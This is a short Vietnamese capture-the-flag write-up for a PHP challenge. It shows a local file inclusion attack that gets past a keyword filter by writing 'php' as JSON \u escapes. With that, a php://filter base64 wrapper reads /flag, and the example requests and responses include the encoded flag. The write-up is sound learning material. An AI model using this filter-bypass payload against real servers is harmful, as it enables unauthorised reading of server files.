# Cách giải

- Server sẽ lấy input từ `POST` request gửi đến, và gọi hàm `file_get_contents`. 
- Bài này mới vào thì có thể đến LFI với filter base64 nhưng nó chặn ngay chữ php, data, file nên mình không thể chuyển qua base64 được
Ta thử đọc file `/flag`

```python

Request: {"page":"/flag"}
Response: {"content":"Invalid content"}

```

- Vì content của file `/flag` có chứa `EHC` nên cần phải encode content của file để có thể in ra thành công.
Trong quá trình reserach thì mình có tìm ra PHP Wrapper có thể encode nội dung của file như sau

`php://filter/convert.base64-encode/resource=/flag`

- Tuy nhiên `php` đã bị filter. JSON có escape character đặc biệt là `\uXXXX` là unicode của UTF-16.
Do PHP không có nên khi kiểm tra `check_valid($body)` sẽ không nhận ra điều gì bất thường. Qua hàm `json_decode()` nó sẽ được decode và đọc.

```python
Request: {"page":"\u0070\u0068\u0070://filter/convert.base64-encode/resource=/flag"}
Response: {"content":"RUhDe3czbGMwbTNfdzNiX3c0cnJqMHJzfQo=="}s
```